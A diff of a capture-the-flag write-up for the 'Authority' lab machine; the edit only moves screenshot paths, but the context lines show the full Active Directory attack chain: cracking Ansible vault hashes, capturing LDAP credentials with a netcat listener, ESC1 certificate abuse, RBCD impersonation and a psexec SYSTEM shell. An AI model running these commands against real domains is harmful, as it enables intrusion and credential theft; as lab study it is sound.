@@ -45,7 +45,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.229.56
 ```
 
-![ping](authority_01_ping.png)
+![ping](screenshots/authority_01_ping.png)
 
 The TTL of 127 confirms a Windows host (default TTL 128, decremented by one hop).
 
@@ -65,7 +65,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.56 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](authority_02_nmap_allports.png)
+![allports](screenshots/authority_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -73,7 +73,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](authority_03_extractports.png)
+![extractports](screenshots/authority_03_extractports.png)
 
 28 open ports identified, including standard DC services (DNS, Kerberos, LDAP, SMB) plus HTTP (80) and HTTPS (8443).
 
@@ -91,8 +91,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](authority_04_nmap_targeted_1.png)
-![targeted 2](authority_05_nmap_targeted_2.png)
+![targeted 1](screenshots/authority_04_nmap_targeted_1.png)
+![targeted 2](screenshots/authority_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -126,7 +126,7 @@ With standard DC ports and two web services identified, SMB anonymous access is 
 smbclient -L //10.129.229.56 -N
 ```
 
-![smb shares](authority_06_smb_shares.png)
+![smb shares](screenshots/authority_06_smb_shares.png)
 
 Two non-standard shares stand out: `Department Shares` and `Development`. The `Development` share is accessible anonymously while `Department Shares` returns `ACCESS_DENIED`.
 
@@ -136,7 +136,7 @@ Recursively listing the Development share reveals Ansible automation playbooks:
 smbclient //10.129.229.56/Development -N -c 'recurse ON; ls'
 ```
 
-![smb development](authority_07_smb_development.png)
+![smb development](screenshots/authority_07_smb_development.png)
 
 The share contents are downloaded for offline analysis:
 
@@ -153,7 +153,7 @@ The downloaded Ansible directory contains four roles: ADCS, LDAP, PWM, and SHARE
 tree
 ```
 
-![ansible tree](authority_08_ansible_tree.png)
+![ansible tree](screenshots/authority_08_ansible_tree.png)
 
 The PWM role's `defaults/main.yml` contains three Ansible Vault-encrypted secrets, and `templates/tomcat-users.xml.j2` has plaintext Tomcat credentials:
 
@@ -162,7 +162,7 @@ cat PWM/defaults/main.yml
 cat PWM/templates/tomcat-users.xml.j2
 ```
 
-![vault secrets](authority_09_vault_secrets.png)
+![vault secrets](screenshots/authority_09_vault_secrets.png)
 
 **Recovered (Tomcat - not directly useful as manager is not exposed):**
 - `admin:T0mc@tAdm1n` (manager-gui)
@@ -188,7 +188,7 @@ python3 /usr/share/john/ansible2john.py vault3 | cut -d: -f2 >> vault_hashes
 hashcat -m 16900 vault_hashes /usr/share/wordlists/rockyou.txt
 ```
 
-![hashcat](authority_10_hashcat.png)
+![hashcat](screenshots/authority_10_hashcat.png)
 
 All three vaults share the same password: `!@#$%^&*`. Decrypting with `ansible-vault`:
 
@@ -198,7 +198,7 @@ cat vault2 | ansible-vault decrypt
 cat vault3 | ansible-vault decrypt
 ```
 
-![vault decrypt](authority_11_vault_decrypt.png)
+![vault decrypt](screenshots/authority_11_vault_decrypt.png)
 
 **Recovered:**
 - `pwm_admin_login` = `svc_pwm`
@@ -214,19 +214,19 @@ Browsing to the Tomcat service on port 8443 reveals a PWM password self-service 
 https://10.129.229.56:8443/pwm/private/login
 ```
 
-![pwm login](authority_12_pwm_login.png)
+![pwm login](screenshots/authority_12_pwm_login.png)
 
 Attempting to log in with `svc_pwm / pWm_@dm!N_!23` triggers Error 5017, revealing the LDAP bind DN `CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb`:
 
-![pwm error](authority_13_pwm_error.png)
+![pwm error](screenshots/authority_13_pwm_error.png)
 
 The Configuration Manager at `/pwm/private/config/manager` accepts the password `pWm_@dm!N_!23`:
 
-![pwm config manager](authority_14_pwm_config_manager.png)
+![pwm config manager](screenshots/authority_14_pwm_config_manager.png)
 
 The Configuration Editor at `/pwm/private/config/editor` provides full access to application settings:
 
-![pwm config editor](authority_15_pwm_config_editor.png)
+![pwm config editor](screenshots/authority_15_pwm_config_editor.png)
 
 ---
 ## 3. Foothold
@@ -237,7 +237,7 @@ The PWM Configuration Editor exposes the LDAP connection settings, including a "
 
 Navigate to **LDAP > LDAP Directories > default > Connection** and add a new LDAP URL pointing to the attacker's IP:
 
-![ldap connection](authority_16_ldap_connection.png)
+![ldap connection](screenshots/authority_16_ldap_connection.png)
 
 Start a netcat listener and click "Test LDAP Profile":
 
@@ -245,7 +245,7 @@ Start a netcat listener and click "Test LDAP Profile":
 nc -lvnp 389
 ```
 
-![ldap capture](authority_17_ldap_capture.png)
+![ldap capture](screenshots/authority_17_ldap_capture.png)
 
 The cleartext LDAP bind credentials arrive on the listener:
 
@@ -260,7 +260,7 @@ Using the captured credentials to connect via WinRM:
 evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 ```
 
-![user flag](authority_18_user_flag.png)
+![user flag](screenshots/authority_18_user_flag.png)
 
 🏁 **User flag obtained:** `C:\Users\svc_ldap\Desktop\user.txt`
 
@@ -275,7 +275,7 @@ The `ADCS` Ansible role found earlier hints at Active Directory Certificate Serv
 certipy-ad find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
 ```
 
-![certipy enum](authority_20_certipy_enum.png)
+![certipy enum](screenshots/authority_20_certipy_enum.png)
 
 The **CorpVPN** template is vulnerable to **ESC1**:
 - `Enrollee Supplies Subject: True` — the requester controls the SAN
@@ -297,7 +297,7 @@ impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -
 certipy-ad req -username 'YOURPC$' -password 'Password123!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
 ```
 
-![addcomputer certreq](authority_21_addcomputer_certreq.png)
+![addcomputer certreq](screenshots/authority_21_addcomputer_certreq.png)
 
 Attempting PKINIT authentication fails with `KDC_ERR_PADATA_TYPE_NOSUPP` — this DC does not support certificate-based Kerberos. Instead, the PassTheCert approach is used to authenticate via LDAP Schannel and set up RBCD:
 
@@ -306,7 +306,7 @@ openssl pkcs12 -in administrator_authority.pfx -nocerts -out admin.key
 openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out admin.crt
 ```
 
-![openssl extract](authority_22_openssl_extract.png)
+![openssl extract](screenshots/authority_22_openssl_extract.png)
 
 ```bash
 python3 PassTheCert/Python/passthecert.py -dc-ip 10.129.229.56 -crt admin.crt -key admin.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'YOURPC$'
@@ -318,7 +318,7 @@ With RBCD configured, S4U2Proxy is used to impersonate Administrator and obtain 
 sudo ntpdate 10.129.229.56 && impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/YOURPC$:Password123!'
 ```
 
-![getST impersonate](authority_23_getst_impersonate.png)
+![getST impersonate](screenshots/authority_23_getst_impersonate.png)
 
 Finally, PsExec is used with the Kerberos ticket to get a SYSTEM shell:
 
@@ -326,7 +326,7 @@ Finally, PsExec is used with the Kerberos ticket to get a SYSTEM shell:
 sudo ntpdate 10.129.229.56 && export KRB5CCNAME=Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache && impacket-psexec -k -no-pass authority.authority.htb
 ```
 
-![root flag](authority_19_root_flag.png)
+![root flag](screenshots/authority_19_root_flag.png)
 
 🏁 **Root flag obtained:** `C:\Users\Administrator\Desktop\root.txt`
 
